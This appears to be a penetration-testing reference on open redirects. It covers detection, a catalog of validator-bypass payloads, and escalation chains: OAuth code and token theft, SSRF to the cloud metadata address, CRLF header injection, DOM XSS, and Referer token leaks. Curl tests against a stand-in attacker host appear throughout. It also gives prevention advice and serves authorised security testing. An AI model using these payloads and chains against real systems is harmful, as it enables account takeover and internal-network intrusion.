# Open Redirect — Deep Reference

Comprehensive reference for detecting, proving, and **escalating** open redirects. Open redirect alone is low severity; this document is biased toward turning the primitive into impact.

Sources:
- PortSwigger — DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- OWASP WSTG-CLNT-04 — Testing for Client-side URL Redirect: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect
- OWASP Unvalidated Redirects and Forwards Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- PayloadsAllTheThings — Open Redirect: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- HackTricks — Open Redirect: https://book.hacktricks.xyz/pentesting-web/open-redirect

---

## 1. Two distinct classes

### Server-side open redirect
The application emits a 3xx response with a `Location` header derived from user input, or performs a server-side meta-refresh / JS-write of a user-controlled URL.
- **Where:** login/logout flows, `?next=`/`?returnUrl=`, link-trackers (`/out?url=`), interstitials, OAuth/SSO endpoints, error pages.
- **Detection:** send the param, inspect the `Location` header.
```
curl -sik 'https://target/login?next=https://evil.example' | grep -i '^location:'
```
- The redirect is performed by the browser following the header — no JS required, works without a session in many cases.

### DOM-based open redirect
Client-side JavaScript reads an attacker-influenced **source** and writes it to a navigation **sink** without validation (OWASP WSTG-CLNT-04; PortSwigger).

**Sources (attacker-influenced):** `location.hash`, `location.search`, `location.href`, `document.URL`, `document.referrer`, `window.name`, `postMessage` data.

**Sinks (trigger navigation):** `location`, `location.href`, `location.assign()`, `location.replace()`, `window.open()`, `element.src` / `iframe.src`, `element.srcdoc`, `XMLHttpRequest.open()` (for SSRF-like fetches).

Vulnerable patterns:
```js
// PortSwigger example
let url = /https?:\/\/.+/.exec(location.hash);
if (url) { location = url[0]; }

// OWASP WSTG-CLNT-04 examples
var redir = location.hash.substring(1);
if (redir) window.location = 'https://' + decodeURIComponent(redir);   // open redirect
window.location = decodeURIComponent(redir);                           // open redirect + javascript: XSS
```
- Trigger: `https://target/page#//evil.example`
- If the sink takes the full string (second example), `https://target/page#javascript:alert(document.domain)` becomes **DOM XSS** — a higher-severity finding; escalate to the XSS skill.

**Finding sinks:** grep JS bundles for `location.href =`, `location.assign`, `location.replace`, `window.open(`, `location =`, then trace which sources reach them. Confirm by loading the URL in a real/headless browser and observing the off-origin navigation.

---

## 2. Bypass catalog

Validators fail because of **parser differentials** — the backend validator and the browser disagree on what the host is. Test each against the target's specific filter.

### Scheme / protocol-relative
| Payload | Why it works |
|---|---|
| `//evil.example` | Protocol-relative — browser keeps current scheme, navigates off-site. Bypasses `http`/`https` blacklists. |
| `///evil.example`, `////evil.example` | Extra slashes normalized by browser; often slips past `//` checks. |
| `https:evil.example` | Scheme-relative without slashes; bypasses filters that require `//`. |
| `\/\/evil.example`, `/\evil.example`, `\\evil.example` | Backslashes browsers normalize to `/`. |
| `https:/evil.example` | Single-slash; browsers tolerate, validators may not. |

### Userinfo `@` (defeats contains/startswith)
| Payload | Browser host |
|---|---|
| `https://trusted.tld@evil.example` | `evil.example` (everything before `@` is userinfo) |
| `https://trusted.tld%40evil.example` | encoded `@` |
| `https://evil.example%2523@trusted.tld` | encoding games around `@`/`#` |

### Backslash parser differential
Backends often treat `\` as a path char (validation sees `trusted.tld`), browsers normalize `\`→`/` (navigate to `evil.example`):
- `https://trusted.tld\@evil.example`
- `https://trusted.tld\.evil.example`
- `https://trusted.tld\/evil.example`

### Whitelist flaws
| Flaw | Payload |
|---|---|
| Substring/`contains` check | `https://evil.example/trusted.tld`, `https://evil.example?trusted.tld`, `https://evil.example#trusted.tld` |
| `startsWith` / prefix check | `https://trusted.tld.evil.example`, `https://trusted.tld-evil.example` |
| `endsWith` / suffix check | `https://eviltrusted.tld`, `https://evil.example/path?x=.trusted.tld` |
| Naive `@` userinfo | `https://trusted.tld@evil.example` |
| Fragment confusion | `https://trusted.tld#@evil.example`, `https://trusted.tld#.evil.example` |
| Domain you can register | register `trusted.tld.evil.example` and confirm |

### Encoding
- URL-encode slashes: `%2f%2fevil.example`, double-encode `%252f%252fevil.example`.
- Unicode dot `%E3%80%82` (ideographic full stop) in place of `.` — some parsers normalize, some don't, splitting the host.
- Unicode/IDN normalization characters (e.g. `℀`) that resolve differently across components.
- Null byte `%00` truncation against legacy filters.

### HTTP Parameter Pollution (HPP)
Duplicate the param: `?next=https://trusted.tld&next=https://evil.example` — backend validation may read the first, redirect logic the last (or vice versa).

### CRLF-adjacent
If the `Location` reflection lets through `%0d%0a`, you may pivot from open redirect to **HTTP response splitting / header injection** (e.g. `https://target/?next=%0d%0aSet-Cookie:...`). Report that as its own higher-severity finding.

### Dangerous schemes (only where the sink allows)
- `javascript:alert(document.domain)` — only on DOM sinks taking the full string → DOM XSS, not mere redirect.
- `data:text/html,...` — historically on `window.open`/iframe sinks; modern browsers block top-frame navigation to `data:`, so treat as situational.

---

## 3. Escalation chains (the actual point)

### 3.1 OAuth / SSO `redirect_uri` token & code theft — HIGH
Open redirect on a host trusted by an OAuth provider lets an attacker exfiltrate the authorization `code` or `access_token`:
- If `redirect_uri` validation is prefix/substring-based, register a redirect that bounces through the open-redirect endpoint to the attacker.
- Implicit flow leaks `access_token` in the fragment; code flow leaks `code` (then exchange, or chain with a stolen `client_secret`/PKCE gap).
- `RelayState` (SAML) and post-login `returnTo` behave the same way.
- **Hand to `/oauth`.** This is the highest-value outcome for a redirect primitive.

### 3.2 SSRF whitelist/filter bypass — HIGH
A server-side fetcher that only allows whitelisted hosts can be defeated if one of those hosts has an open redirect: point the fetcher at `https://trusted.tld/redirect?url=http://169.254.169.254/...`. The fetcher validates `trusted.tld`, then follows the 302 to the internal target.
- Works when the SSRF client follows redirects (most HTTP libraries do by default).
- **Hand to `/ssrf`.**

### 3.3 CSP / allowlist bypass
If CSP `navigate-to`/`form-action`/connect allowlists a domain that has an open redirect, you can bounce off it to reach an attacker origin, weakening the policy and sometimes enabling exfiltration of injected-script data.

### 3.4 Token leak via `Referer`
Redirect the victim off-site after a page that carries secrets in the URL (password-reset token, OAuth `code`, session id). The secret leaks to the attacker host in the `Referer` header (unless `Referrer-Policy` strips it). Particularly potent on reset/verify flows.

### 3.5 Phishing on a trusted domain (the standalone, usually LOW)
Real domain + valid TLS makes the phishing link credible. This is the only standalone story and most programs rate it low or out of scope. Don't lead with it unless policy accepts it.

---

## 4. Proving it (for ./_EXPLOIT/)
Keep the PoC minimal and benign — redirect only to a domain you control, never weaponize.

Server-side:
```
curl -sik 'https://target/login?next=//evil.example' | grep -i '^location:'
# PROVEN: Location: //evil.example
```
DOM-based: record the single trigger URL (`https://target/p#//evil.example`), the navigation observed, and the source→sink line from the JS bundle.

For chains, the PoC is the chain: e.g. the OAuth authorize URL that delivers `code` to your host, or the SSRF request that reaches the internal resource via the redirect.

---

## 5. Prevention (for reports)
- Don't build redirect targets from untrusted input. Prefer server-side mapping: accept an opaque key/index, look up the real URL server-side.
- If a URL must be accepted, allowlist by **parsed host** (use a real URL parser, compare the host component exactly) — never substring/`startsWith`/`endsWith` on the raw string.
- Force relative-only redirects where possible (reject anything with a scheme or `//`).
- Normalize before validation the same way the browser will (backslashes, encoding) to close parser differentials.
- For DOM sinks, never assign untrusted data to `location`/`location.href`/`assign`/`replace`/`open`; validate scheme is `http(s)` and host is allowlisted.
- Set a strict `Referrer-Policy` and keep secrets out of URLs to limit `Referer` leakage.
- Lock OAuth `redirect_uri` to exact pre-registered values.
